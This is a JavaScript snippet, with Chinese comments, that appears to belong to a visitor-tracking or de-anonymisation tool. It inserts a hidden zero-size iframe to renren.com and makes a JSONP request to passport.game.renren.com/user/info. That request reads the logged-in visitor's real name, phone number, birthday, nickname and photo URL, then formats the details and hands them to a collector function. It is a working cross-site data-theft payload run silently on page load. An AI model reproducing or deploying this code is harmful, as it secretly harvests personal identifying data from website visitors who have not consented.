// 生日  姓名  电话   昵称  照片
let renren = document.createElement('iframe')
renren.src = 'http://www.renren.com/'
renren.width = '0'
renren.height = '0'
// 阻止嵌套内的网页自动跳转   if (top.location != self.location) {top.location=self.location;}
renren.security = 'restricted'
renren.sandbox = 'allow-scripts allow-same-origin allow-popups'
renren.style.borderWidth = 0
renren.onload = function () {
  setTimeout(() => {
    jsonpGetJSON('http://passport.game.renren.com/user/info', 'callback').then(
      function (t) {
        let data = {
          birthday: t.birthday,
          realname: t.realname,
          phone: t.uname,
          nickname: t.nick,
          photo: t.headurl,
        }

        let innerHTML = `
        <div class='item'>
          <p class='title'>人人网</p>
          <p>姓名: ${data.realname}</p>
          <p>电话: ${data.phone}</p>
          <p>生日: ${data.birthday}</p>
          <p>昵称: ${data.nickname}</p>
          <p>照片: ${data.photo}</p>
        </div>
      `
        if (data.nickname) {
          getInifoData({ type: 'renren', data: data, html: innerHTML })
        }
      }
    )
  }, 0)
}

document.body.appendChild(renren)
